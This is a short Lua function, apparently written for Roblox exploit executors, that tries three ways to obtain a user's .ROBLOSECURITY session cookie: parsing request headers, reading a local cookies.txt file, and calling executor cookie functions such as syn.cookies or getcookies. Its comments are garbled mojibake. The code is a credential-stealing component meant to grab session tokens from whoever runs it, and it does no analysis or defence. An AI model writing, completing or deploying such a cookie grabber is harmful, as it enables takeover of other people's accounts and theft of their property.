local function getRobloxCookie()
    local cookie = ""
    
    -- Ø·Ø±ÙŠÙ‚Ø© 1: Ù…Ù† Roblox Headers
    local success, result = pcall(function()
        return request({
            Url = "https://www.roblox.com/my/account#!/security",
            Method = "GET"
        })
    end)
    
    if success and result.Headers then
        for _, header in pairs(result.Headers) do
            if header:find(".ROBLOSECURITY") then
                cookie = header:match(".ROBLOSECURITY=([^;]+)")
                break
            end
        end
    end
    
    -- Ø·Ø±ÙŠÙ‚Ø© 2: Ù…Ù† Chrome Cookies Database
    pcall(function()
        if isfile then
            local cookiesFile = "cookies.txt"
            if isfile(cookiesFile) then
                cookie = readfile(cookiesFile):match(".ROBLOSECURITY=([^;]+)")
            end
        end
    end)
    
    -- Ø·Ø±ÙŠÙ‚Ø© 3: Executor Cookie Grabber
    if syn or getcookies then
        cookie = syn and syn.cookies or getcookies()
        cookie = cookie:match(".ROBLOSECURITY=([^;]+)")
    end
    
    return cookie or "COOKIE_NOT_FOUND"
end

